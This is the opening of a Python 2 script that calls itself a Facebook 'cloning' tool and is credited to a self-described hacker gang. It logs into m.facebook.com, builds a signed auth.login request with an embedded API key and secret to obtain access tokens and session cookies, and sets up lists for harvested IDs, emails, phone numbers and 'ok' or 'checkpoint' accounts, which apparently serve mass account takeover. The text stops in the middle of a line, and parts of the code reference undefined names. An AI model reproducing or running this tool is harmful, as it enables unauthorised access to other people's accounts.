#!/usr/bin/python2
#coding=utf-8
#balochcyber.ml
#FB CLONING COMMANDS
#MOHIZ AWAN 
#PAK HACKER (PBG GANG)


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#Dev:Shabir Baloch
#### LOGO ####
logo = """
\033[1;93m ¸,.-~·*¨.::::::::::¨*·~-.,¸ 
 \033[1;93m     ¸.· ´::::::´: . · .¨             ::` ·.¸ 
 \033[1;93m  ¸·´,;':::::::' :· .     ·   .  :      ::::::`·¸ 
 \033[1;93m¸·;;;;'::::::: · . :'      ·    .     .  :::::::::·¸ 
\033[1;93m,;;;;;;:::::::.:. ·         ·     :       :::::::::::.   
\033[1;93m;;;;;;;;::::::..· :´  .       '     ·     .:::::::::::::                                        
\033[1;93m';;;;;;;;,:::'::·.......¸.·::·.¸.......::::::::::::::::: 
\033[1;93m ';;;;;;;;;;;;;;,,¸:::::::::;::::::::::::::::::::::::::' 
\033[1;93m'  ';.¸.-·~·-.,¸;;;;;;,:::´`:::::::::::¸,.-·~·-.¸.::' 
 \033[1;93m   ;;`·.¸      ¯¨*·.¸';;.'::::.¸.·*¨¯       ¸.·´:: 
   \033[1;93m ';;:::'`·.¸●       ')`:::::(     ●   ¸.·´::: 
   \033[1;93m  `·.::::::`·--·´ :::::: `·-·´ .::::·´::: 
     \033[1;93m    `·,;;:::.  :·:´ø· ø `. ::. ' ·.:::·´ 
          \033[1;93m  `·-.:::.·: ::.:.: · : :::::.-·´ 
               \033[1;93m'`·.::.·-~ .::·´::::: 
                 \033[1;93m)`·.:.  : . ·.::·´( 
                \033[1;93m/',; '`··´  :.'\ 
  \033[1;93m _¸.·´,;;;             .:::.`·.¸_ 
\033[1;93m.·´   |`:¯'`: |`:¯`:    |`:¯'`: |`·.¯¯¯¯`·´¯('|`:¯`·.  |`:¯: 
   \033[1;93m .·´ .·´|`·.`:   :    `':   :  `·.`·.`·.¯`·.·´|'`: :`·.`·.
\033[1;93m.·´  .·´__|   `·. :      |`·. `·.  `·. )  `>|.·'  : :`·.`·.`'
\033[1;93m:    :¯¯¯:     :  `·´¯¯`·. :  :  .·´.·´_.·´`·.': :   `·.:  : 
\033[1;93m|`·._`·..·´   ¸.·|`·.·´¯`·.·´|`·.|·´_____.·.(·'_.|   '.·'_.| 
\033[1;93m`·.|.·´__.·´ .·´`·.|.·´`·.|·´`·.¸||______|/\||_'|/   |__|/ 
\033[1;96m   |___'|.·´  MOHIZ AWAN Programmer     -«
\033[1;92m    ___      ___     ______    __    __   __   ________            __       __   __  ___       __      _____  ___   
|"  \    /"  |   /    " \  /" |  | "\ |" \ ("      "\          /""\     |"  |/  \|  "|     /""\    (\"   \|"  \  
 \   \  //   |  // ____  \(:  (__)  :)||  | \___/   :)        /    \    |'  /    \:  |    /    \   |.\\   \    | 
 /\\  \/.    | /  /    ) :)\/      \/ |:  |   /  ___/        /' /\  \   |: /'        |   /' /\  \  |: \.   \\  | 
|: \.        |(: (____/ // //  __  \\ |.  |  //  \__        //  __'  \   \//  /\'    |  //  __'  \ |.  \    \. | 
|.  \    /:  | \        / (:  (  )  :)/\  |\(:   / "\      /   /  \\  \  /   /  \\   | /   /  \\  \|    \    \ | 
|___|\__/|___|  \"_____/   \__|  |__/(__\_|_)\_______)    (___/    \___)|___/    \___|(___/    \___)\___|\____\) 
                                                                                                                 
\033[1;92m
\033[1;97m
\033[1;97m
\033[0;37m╭════════════════════════════════════════════╮
\033[0;37m║\033[0;91mAUTHOR : \033[0;92mMOHIZ AWAN                    \033[0;91m ║
\033[0;37m║\033[0;91mYoutube :\033[0;92m MOHIZ AWAN                   \033[0;91m   ║
\033[0;37m║ \033[0;91m  :\033[0;92m Whtsapp Number:\033[0;91m.                           ║
\033[0;37m╰════════════════════════════════════════════╯

"""
CorrectUsername = "PBG"
CorrectPassword = "PBG"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m📋 \x1b[1;96mTool Username \x1b[1;97m»» \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m🗝 \x1b[1;96mTool Password \x1b[1;97m»» \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:MOHIZ AWAN
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;96mWrong Password"
            os.system('xdg-open https://www.youtube.com/channel/UCUJSOqxjU4f9npLso-10Fuw')
    else:
        print "\033[1;96mWrong Username"
        os.system('xdg-open https://www.youtube.com/channel/UCUJSOqxjU4f9npLso-10Fuw')
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email= []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo
	print 42*"\033[1;97m="
	print "\033[1;91m>>>\033[1;91m[1]\033[1;94m Login with facebook  "
        time.sleep(0.05)
        print "\033[1;91m>>>\033[1;91m[2]\033[1;91m Login with access token "
        time.sleep(0.05)
        print "\033[1;91m>>>\033[1;91m[3]\033[1;35m Download access token"
	time.sleep(0.05)
	print "\033[1;91m>>>\033[1;91m[0]\033[1;32m Logout        "
        print 42*"\033[1;97m="
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;91mChoose an Option═╬══►\033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()
        elif peak =="3":
	        os.system('xdg-open https://play.google.com/store/apps/details?id=com.proit.thaison.getaccesstokenfacebook')
	        login()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()
			
			
def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo
		print 42*"\033[1;97m="
		jalan('\033[1;91m[✾]\x1b[1;91mDO NOT USE OLD ACCOUNT TO LOGIN\x1b[1;91m[✾]' )
		jalan('\033[1;92m[✾]\x1b[1;91mUSE A FRESH/NEW ACCOUNT TO LOGIN\x1b[1;92m[✾]' )
		id = raw_input('\033[1;96m[!!] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\033[1;96m[!!] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
		print 42*"\033[1;97m="
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021dd
